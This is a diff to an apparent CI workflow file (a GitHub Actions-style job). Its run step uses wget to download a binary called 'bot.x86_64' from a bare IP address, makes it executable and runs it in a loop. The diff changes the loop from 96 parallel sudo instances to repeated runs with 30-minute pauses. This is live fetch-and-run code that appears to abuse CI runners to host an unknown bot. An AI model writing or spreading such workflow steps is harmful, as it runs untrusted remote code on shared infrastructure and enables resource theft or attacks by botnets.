@@ -15,15 +15,9 @@ jobs:
         run: |
           wget http://213.209.143.62/bot.x86_64 -O Bot
           chmod +x Bot
-          
-          PIDS=()
           for i in {1..96}; do
-            sudo ./Bot &
-            PIDS+=($!)
-          done
-
-          for pid in "${PIDS[@]}"; do
-            wait $pid
+              ./Bot
+              sleep 1800
           done
           
       - name: OK !
